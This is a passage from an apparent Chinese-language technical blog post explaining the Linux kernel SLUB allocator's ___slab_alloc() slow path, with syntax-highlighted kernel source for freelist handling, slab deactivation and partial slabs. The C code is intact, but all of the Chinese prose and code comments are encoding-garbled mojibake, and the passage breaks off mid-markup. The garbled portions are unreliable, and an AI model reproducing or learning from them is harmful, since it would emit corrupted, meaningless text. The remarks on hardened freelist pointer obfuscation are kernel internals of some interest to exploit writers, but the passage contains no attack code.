class="hljs-type">long</span> flags;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">partial_context</span> <span class="hljs-title">pc</span>;</span><br><br>stat(s, ALLOC_SLOWPATH);<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ç¬”è€…æŒ‰ç…§ä»£ç æ ‡ç­¾é¡ºåºè¿›è¡Œåˆ†æ</p><h4 id="â‘ -reread-slabï¼šè¯»å–-percpu-slab">â‘  reread_slabï¼šè¯»å– percpu slab</h4><p>é¦–å…ˆè¯»å– percpu çš„ slabï¼Œè‹¥æ²¡æœ‰ slab åˆ™åˆ¤æ–­åˆ†é…èŠ‚ç‚¹ï¼Œå¹¶è·³è½¬åˆ° <code>new_slab</code> åˆ†é…æ–°çš„ slabï¼Œæ³¨æ„è¿™ä¸€å—ä»£ç å¯¹åº” <code>reread_slab</code> æ ‡ç­¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">reread_slab:<br><br>slab = READ_ONCE(c-&gt;slab);<br><span class="hljs-keyword">if</span> (!slab) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è‹¥ node æœªä¸Šçº¿æˆ–æ²¡æœ‰ normal memoryï¼Œå¿½ç•¥ node çº¦æŸ</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(node != NUMA_NO_NODE &amp;&amp;<br>     !node_isset(node, slab_nodes)))<br>node = NUMA_NO_NODE;<br><span class="hljs-keyword">goto</span> new_slab;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="â‘¡-redoï¼šè·å–-percpu-slab-freelist">â‘¡ redoï¼šè·å– percpu slab-&gt;freelist</h4><p>æ¥ä¸‹æ¥è¿™å—ä»£ç å¯¹åº” <code>redo</code> æ ‡ç­¾ï¼š</p><ul><li><p>è‹¥ percpu slab ä¸ä¸ºç©ºï¼Œåˆ¤æ–­ slab æ˜¯å¦å±äºæŒ‡å®šçš„èŠ‚ç‚¹ä¸”ä¸åˆ†é…æ ‡å¿—ä½åŒ¹é…ï¼Œè‹¥å¦ï¼Œåˆ™è·³è½¬åˆ° <code>deactivate_slab</code> æ ‡ç­¾</p></li><li><p>æ¥ä¸‹æ¥æ£€æŸ¥ slab æ˜¯å¦ä»ä¸ºåŸæ¥çš„ cpu slabï¼ˆå› ä¸ºæˆ‘ä»¬å¯èƒ½è¢«æŠ¢å ï¼‰ï¼Œè‹¥å¦ï¼Œåˆ™è·³è½¬å› <code>reread_slab</code></p></li><li><p>æ¥ä¸‹æ¥è·å– per-cpu çš„ freelistï¼Œè‹¥ä¸ä¸ºç©ºï¼Œåˆ™è·³è½¬åˆ° <code>load_freelist</code>ï¼Œå¦åˆ™<strong>è°ƒç”¨ <code>get_freelist()</code> è·å– slab çš„ freelist</strong></p></li><li><p>è‹¥ slab çš„ freelist ä»ä¸ºç©ºï¼Œå°† per-cpu freelist è®¾ä¸º NULLï¼Œè·å–ä¸‹ä¸€ä¸ª tidï¼Œå¹¶è·³è½¬åˆ° <code>new_slab</code> åˆ†é…æ–°çš„ slab</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c">redo:<br><br><span class="hljs-keyword">if</span> (unlikely(!node_match(slab, node))) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ä¸ä¸Šé¢ç›¸åŒä½† node_match() ä¸º false åˆ™æ—©å·²è¯´æ˜ node != NUMA_NO_NODE</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!node_isset(node, slab_nodes)) &#123;<br>node = NUMA_NO_NODE;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>stat(s, ALLOC_NODE_MISMATCH);<br><span class="hljs-keyword">goto</span> deactivate_slab;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æˆ‘ä»¬ç†åº”æœç´¢ä¸€ä¸ª PFMEMALLOC çš„ slab é¡µé¢ï¼Œä½†ç°åœ¨ï¼Œ</span><br><span class="hljs-comment"> * å½“é¡µé¢ç¦»å¼€ per-cpu åˆ†é…å™¨ï¼Œæˆ‘ä»¬æ­£åœ¨å¤±å» pfmemalloc ä¿¡æ¯</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(!pfmemalloc_match(slab, gfpflags)))<br><span class="hljs-keyword">goto</span> deactivate_slab;<br><br><span class="hljs-comment">/* å¿…é¡»å†æ¬¡æ£€æŸ¥ c-&gt;slab ä»¥å…æˆ‘ä»¬è¢«æŠ¢å ä½¿å…¶å‘ç”Ÿäº†æ›´æ”¹ */</span><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">if</span> (unlikely(slab != c-&gt;slab)) &#123;<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">goto</span> reread_slab;<br>&#125;<br>freelist = c-&gt;freelist;<br><span class="hljs-keyword">if</span> (freelist)<br><span class="hljs-keyword">goto</span> load_freelist;<br><br>freelist = get_freelist(s, slab);<br><br><span class="hljs-keyword">if</span> (!freelist) &#123;<br>c-&gt;slab = <span class="hljs-literal">NULL</span>;<br>c-&gt;tid = next_tid(c-&gt;tid);<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br>stat(s, DEACTIVATE_BYPASS);<br><span class="hljs-keyword">goto</span> new_slab;<br>&#125;<br><br>stat(s, ALLOC_REFILL);<br></code></pre></td></tr></table></figure><p><code>get_freelist()</code> å‡½æ•°ä¸»è¦å°±æ˜¯è·å– <code>slab-&gt;freelist</code> åå°† <code>slab-&gt;freelist</code> è®¾ä¸º NULL å¹¶è¿”å›åŸæ¥çš„ freelist</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æ£€æŸ¥ slab-&gt;freelist å¹¶å°† freelist ä¼ é€ç»™ percpu freelist</span><br><span class="hljs-comment"> * æˆ–æ˜¯å°† slab ç»™ deactivate.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è‹¥è¿”å›å€¼é NULL åˆ™ slab ä»è¢«å†»ç»“.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è‹¥è¯¥å‡½æ•°è¿”å› NULL åˆ™ slab è¢«è§£å†».</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">get_freelist</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">new</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> counters;<br><span class="hljs-type">void</span> *freelist;<br><br>lockdep_assert_held(this_cpu_ptr(&amp;s-&gt;cpu_slab-&gt;lock));<br><br><span class="hljs-keyword">do</span> &#123;<br>freelist = slab-&gt;freelist;<br>counters = slab-&gt;counters;<br><br>new.counters = counters;<br>VM_BUG_ON(!new.frozen);<br><br>new.inuse = slab-&gt;objects;<br>new.frozen = freelist != <span class="hljs-literal">NULL</span>;<br><br>&#125; <span class="hljs-keyword">while</span> (!__cmpxchg_double_slab(s, slab,<br>freelist, counters,<br><span class="hljs-literal">NULL</span>, new.counters,<br><span class="hljs-string">&quot;get_freelist&quot;</span>));<br><br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="â‘¢-load-freelistï¼šä»-freelist-åˆ†é…å¯¹è±¡">â‘¢ load_freelistï¼šä» freelist åˆ†é…å¯¹è±¡</h4><p>ç»§ç»­è¿”å› <code>___slab_alloc()</code> ä¸­ï¼Œæ¥ä¸‹æ¥è¿™å—ä»£ç å¯¹åº” <code>load_freelist</code> æ ‡ç­¾ï¼Œä¸»è¦å°±æ˜¯è°ƒç”¨ <code>get_freepointer()</code> å°† percpu freelist æŒ‡å‘ç¬¬äºŒä¸ªç©ºé—²å¯¹è±¡ï¼Œå¹¶è·å–ä¸‹ä¸€ä¸ª tid åè¿”å›å‰é¢è·å–çš„ freelistï¼ˆä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªç©ºé—²å¯¹è±¡ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">load_freelist:<br><br>lockdep_assert_held(this_cpu_ptr(&amp;s-&gt;cpu_slab-&gt;lock));<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * freelist æŒ‡å‘è¦è¢«ä½¿ç”¨çš„å¯¹è±¡é“¾è¡¨. slab æŒ‡å‘è·å¾—å¯¹è±¡çš„ slab.</span><br><span class="hljs-comment"> * å› æ­¤ slab å¿…é¡»è¢«å†»ç»“ä»¥è®© percpu çš„åˆ†é…æ­£å¸¸å·¥ä½œ.</span><br><span class="hljs-comment"> */</span><br>VM_BUG_ON(!c-&gt;slab-&gt;frozen);<br>c-&gt;freelist = get_freepointer(s, freelist);<br>c-&gt;tid = next_tid(c-&gt;tid);<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">return</span> freelist;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ³¨æ„åœ¨ <code>get_freepointer()</code> é‡Œå¥—äº†ä¸¤å±‚ï¼Œæœ€åä¼šè°ƒç”¨åˆ° <code>freelist_ptr()</code> è·å–åˆ°ç¬¬äºŒä¸ªç©ºé—²å¯¹è±¡çš„æŒ‡é’ˆï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯å½“å¼€å¯äº† Hardened freelist ä¿æŠ¤ååœ¨ next æŒ‡é’ˆçš„ä½ç½®å­˜æ”¾çš„æ˜¯ <strong>ç¬¬ä¸€ä¸ªç©ºé—²å¯¹è±¡åœ°å€ ^ ç¬¬äºŒä¸ªç©ºé—²å¯¹è±¡åœ°å€ ^ ä¸€ä¸ªéšæœºå€¼</strong>ï¼ˆ<code>kmem_cache-&gt;random</code>ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è¿”å› freelist æŒ‡é’ˆ (ptr). åœ¨æœ‰åŠ å›ºçš„æƒ…å†µä¸‹å…¶é€šè¿‡ä¸€ä¸ª</span><br><span class="hljs-comment"> * å¯¹å­˜å‚¨æŒ‡é’ˆçš„åœ°å€ä¸ per-cache éšæœºå€¼çš„å¼‚æˆ–è¿›è¡Œæ··æ·†.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">freelist_ptr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">void</span> *ptr,</span><br><span class="hljs-params"> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ptr_addr)</span><br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * å½“å¼€å¯äº† CONFIG_KASAN_SW/HW_TAGS, ptr_addr å¯èƒ½è¢«æ‰“ä¸Šæ ‡ç­¾.</span><br><span class="hljs-comment"> * é€šå¸¸è¿™ä¸ä¼šé€ æˆä»»ä½•é—®é¢˜ï¼Œå› ä¸º set_freepointer() ä¸ get_freepointer() </span><br><span class="hljs-comment"> * è°ƒç”¨æ—¶éƒ½ä¼šæœ‰æ ‡ç­¾ç›¸åŒçš„æŒ‡é’ˆ.</span><br><span class="hljs-comment"> * ä½†æ˜¯ CONFIG_SLUB_DEBUG çš„ä»£ç æœ‰äº›é—®é¢˜. ä¾‹å¦‚å½“ __free_slub() åœ¨</span><br><span class="hljs-comment"> * ä¸€ä¸ª cache ä¸­è¿­ä»£å¯¹è±¡æ—¶,å…¶å°†æ²¡æœ‰æ ‡ç­¾çš„æŒ‡é’ˆä¼ ç»™ check_object(). </span><br><span class="hljs-comment"> * check_object() ä¾æ¬¡å¸¦ç€ä¸€ä¸ªæ²¡æœ‰æ ‡ç­¾çš„æŒ‡é’ˆè°ƒç”¨ get_freepointer()ï¼Œ</span><br><span class="hljs-comment"> * ä»è€Œé€ æˆ freepointer å­˜å‚¨é”™è¯¯.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *)((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)ptr ^ s-&gt;random ^<br>swab((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)kasan_reset_tag((<span class="hljs-type">void</span> *)ptr_addr)));<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-keyword">return</span> ptr;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br></code></pre></td></tr></table></figure><p>ä»è¿™é‡Œæˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹å‡º <strong>slab-&gt;freelist æ˜¯æ²¡æœ‰åŠ å¯†çš„ï¼Œä½†é“¾è¡¨ä¸Šçš„åç»­æŒ‡é’ˆéƒ½æ˜¯åŠ å¯†äº†çš„</strong></p><h4 id="â‘£-deactivate-slabï¼šdeactivate-percpu-slab">â‘£ deactivate_slabï¼šdeactivate percpu slab</h4><p>ç»§ç»­è¿”å› <code>___slab_alloc()</code> ä¸­ï¼Œæ¥ä¸‹æ¥è¿™å—ä»£ç å¯¹åº” <code>deactivate_slab</code> æ ‡ç­¾ï¼Œé¦–å…ˆè¿˜æ˜¯æƒ¯ä¾‹åœ°æ£€æŸ¥æ˜¯å¦è¢«æŠ¢å è°ƒåº¦åˆ°äº†åˆ«çš„ CPUï¼Œè‹¥æ˜¯åˆ™è·³è½¬å› <code>reread_slab</code>ï¼›ä¹‹åå°±æ˜¯ç®€å•åœ°å°† percpu çš„ slab å’Œ freelist è®¾ä¸º NULL å¹¶è·å–ä¸‹ä¸€ä¸ª tidï¼Œä¹‹åè°ƒç”¨ <code>deactivate_slab()</code> å°†è¿™å¼  slab ç»™ deactivate äº†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">deactivate_slab:<br><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">if</span> (slab != c-&gt;slab) &#123;<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">goto</span> reread_slab;<br>&#125;<br>freelist = c-&gt;freelist;<br>c-&gt;slab = <span class="hljs-literal">NULL</span>;<br>c-&gt;freelist = <span class="hljs-literal">NULL</span>;<br>c-&gt;tid = next_tid(c-&gt;tid);<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br>deactivate_slab(s, slab, freelist);<br></code></pre></td></tr></table></figure><p><code>deactivate_slab()</code> çš„é€»è¾‘å¦‚ä¸‹ï¼š</p><ul><li>éå† freelist æ£€æŸ¥æ˜¯å¦è¢«ç ´åï¼Œæ”¾å¼ƒè¢«ç ´åçš„éƒ¨åˆ†</li><li>å°† <code>slab-&gt;freelist</code> è®¾ä¸ºåŸ <code>kmem_cache_cpu-&gt;freelist</code>ï¼Œè‹¥ slab ä¸ŠåŸæœ‰ freelist ä¸ä¸º NULL åˆ™å†æ¥åˆ°åé¢</li><li>è®¾ç½® slab çš„ countersï¼Œå…¶ä¸­<strong>å°† <code>frozen</code> è®¾ä¸º 0</strong></li><li>è‹¥ slab ä¸Šçš„å¯¹è±¡å…¨éƒ¨ç©ºé—²<strong>ä¸” node çš„ partial slab æ•°é‡å¤§äº <code>kmem_cache-&gt;min_partial</code></strong>ï¼Œè°ƒç”¨ <code>discard_slab()</code> å°† slab é‡Šæ”¾</li><li>è‹¥ slab ä¸Šå­˜åœ¨ç©ºé—²å¯¹è±¡ï¼Œè°ƒç”¨ <code>add_partial()</code> å°†å…¶åŠ å…¥ node çš„ partial é“¾è¡¨</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ç»“æŸç§»é™¤ cpu slab. åˆå¹¶ cpu&#x27;s freelist ä¸ slab&#x27;s freelist,</span><br><span class="hljs-comment"> * è§£å†» slabs å¹¶æ”¾åœ¨åˆé€‚çš„é“¾è¡¨ä¸Š.</span><br><span class="hljs-comment"> * å‡è®¾ slab å·²ç»è¢«è°ƒç”¨è€…å®‰å…¨åœ°ä» kmem_cache_cpu ä¸Šå–ä¸‹.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">deactivate_slab</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab,</span><br><span class="hljs-params">    <span class="hljs-type">void</span> *freelist)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">slab_modes</span> &#123;</span> M_NONE, M_PARTIAL, M_FREE, M_FULL_NOLIST &#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">n</span> =</span> get_node(s, slab_nid(slab));<br><span class="hljs-type">int</span> free_delta = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">slab_modes</span> <span class="hljs-title">mode</span> =</span> M_NONE;<br><span class="hljs-type">void</span> *nextfree, *freelist_iter, *freelist_tail;<br><span class="hljs-type">int</span> tail = DEACTIVATE_TO_HEAD;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">new</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">old</span>;</span><br><br><span class="hljs-keyword">if</span> (slab-&gt;freelist) &#123;<br>stat(s, DEACTIVATE_REMOTE_FREES);<br>tail = DEACTIVATE_TO_TAIL;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * é˜¶æ®µä¸€: ç»Ÿè®¡ cpu&#x27;s freelist ä¸Šçš„å¯¹è±¡æ•°é‡ï¼ˆfree_deltaï¼‰ </span><br><span class="hljs-comment"> * å¹¶ä¿å­˜æœ€åä¸€ä¸ªå¯¹è±¡ï¼ˆfreelist_tailï¼‰ ç”¨äºåé¢çš„æ‹¼æ¥.</span><br><span class="hljs-comment"> */</span><br>freelist_tail = <span class="hljs-literal">NULL</span>;<br>freelist_iter = freelist;<br><span class="hljs-keyword">while</span> (freelist_iter) &#123;<br>nextfree = get_freepointer(s, freelist_iter);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è‹¥ &#x27;nextfree&#x27; æ— æ•ˆ, åœ¨ &#x27;freelist_iter&#x27; ä¸Šçš„å¯¹è±¡å¯èƒ½å·²è¢«ç ´å.</span><br><span class="hljs-comment"> * æ•…é€šè¿‡ç•¥è¿‡ &#x27;freelist_iter&#x27; èµ·çš„æ‰€æœ‰å¯¹è±¡æ¥è¿›è¡Œéš”ç¦».</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (freelist_corrupted(s, slab, &amp;freelist_iter, nextfree))<br><span class="hljs-keyword">break</span>;<br><br>freelist_tail = freelist_iter;<br>free_delta++;<br><br>freelist_iter = nextfree;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * é˜¶æ®µäºŒ: è§£å†»slabå¹¶å°†per-cpu freelistæ‹¼æ¥åˆ°slab&#x27;s freelistå¤´éƒ¨.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ç¡®ä¿é“¾è¡¨çš„å­˜åœ¨åæ˜ äº†åœ¨è§£å†»æœŸé—´å®é™…çš„å¯¹è±¡æ•°é‡æ—¶ï¼Œslab å·²è¢«è§£å†».</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * æˆ‘ä»¬é¦–å…ˆåœ¨æŒæœ‰é”çš„æƒ…å†µä¸‹è¿›è¡Œcompxchgå¹¶å½“å…¶æˆåŠŸæ—¶å°† slab æ’å…¥é“¾è¡¨.</span><br><span class="hljs-comment"> * è‹¥æœ‰ä¸åŒ¹é…çš„æƒ…å†µåˆ™ slab ä¸ºæœªå†»ç»“ä¸” slab ä¸Šçš„æ•°é‡å¯èƒ½å‘ç”Ÿäº†æ”¹å˜.</span><br><span class="hljs-comment"> * é‡Šæ”¾é”å¹¶å†æ¬¡é‡è¯• cmpxchg.</span><br><span class="hljs-comment"> */</span><br>redo:<br><br>old.freelist = READ_ONCE(slab-&gt;freelist);<br>old.counters = READ_ONCE(slab-&gt;counters);<br>VM_BUG_ON(!old.frozen);<br><br><span class="hljs-comment">/* ç¡®å®š slab çš„ç›®æ ‡çŠ¶æ€ */</span><br>new.counters = old.counters;<br><span class="hljs-keyword">if</span> (freelist_tail) &#123;<br>new.inuse -= free_delta;<br>set_freepointer(s, freelist_tail, old.freelist);<br>new.freelist = freelist;<br>&#125; <span class="hljs-keyword">else</span><br>new.freelist = old.freelist;<br><br>new.frozen = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (!new.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial) &#123;<br>mode = M_FREE;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (new.freelist) &#123;<br>mode = M_PARTIAL;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æŒæœ‰è‡ªæ—‹é”æ¶ˆé™¤äº†acquire_slab()çœ‹åˆ°ä¸€ä¸ªslabä¸ºå†»ç»“çš„å¯èƒ½æ€§</span><br><span class="hljs-comment"> */</span><br>spin_lock_irqsave(&amp;n-&gt;list_lock, flags);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>mode = M_FULL_NOLIST;<br>&#125;<br><br><br><span class="hljs-keyword">if</span> (!cmpxchg_double_slab(s, slab,<br>old.freelist, old.counters,<br>new.freelist, new.counters,<br><span class="hljs-string">&quot;unfreezing slab&quot;</span>)) &#123;<br><span class="hljs-keyword">if</span> (mode == M_PARTIAL)<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br><br><br><span class="hljs-keyword">if</span> (mode == M_PARTIAL) &#123;<br>add_partial(n, slab, tail);<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br>stat(s, tail);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mode == M_FREE) &#123;<br>stat(s, DEACTIVATE_EMPTY);<br>discard_slab(s, slab);<br>stat(s, FREE_SLAB);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mode == M_FULL_NOLIST) &#123;<br>stat(s, DEACTIVATE_FULL);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="â‘£-new-slabï¼šè·å–-percpu-partial-slab">â‘£ new_slabï¼šè·å– percpu partial slab</h4><p>æ¥ä¸‹æ¥æ˜¯ <code>new_slab</code> æ ‡ç­¾ï¼Œä¸»è¦å°±æ˜¯æ£€æŸ¥è‹¥æœ‰ percpu partial slab åˆ™ä» percpu partial é“¾è¡¨ä¸Šè·å–ä¸€ä¸ª slab å°†å…¶è®¾ä¸º percpu slab å å†è·³è½¬å› <code>redo</code> æ ‡ç­¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 